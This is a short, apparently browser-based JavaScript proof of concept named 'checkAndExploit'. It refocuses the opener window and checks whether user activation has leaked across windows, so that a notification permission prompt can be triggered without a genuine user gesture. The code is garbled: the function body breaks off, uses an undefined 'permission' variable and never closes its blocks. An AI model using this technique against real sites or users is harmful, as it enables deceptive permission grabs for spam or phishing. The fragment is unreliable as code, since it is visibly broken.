    <script>
        if (window.opener) {
            setTimeout(() => {
                window.opener.focus();
            }, 500);
        }

        let triggered = false;

        function checkAndExploit(triggerSource) {
            const isActive = navigator.userActivation.isActive;
            const statusElement = document.getElementById('notif-status');

            console.log(`[${triggerSource}] Activation state:`, isActive);

            if (isActive && !triggered) {
                triggered = true;
                console.log("[!] Activation leak detected. Triggering Notification Request...");

                    console.log("Notification status:", permission);

        window.addEventListener("focus", () => checkAndExploit("focus"));
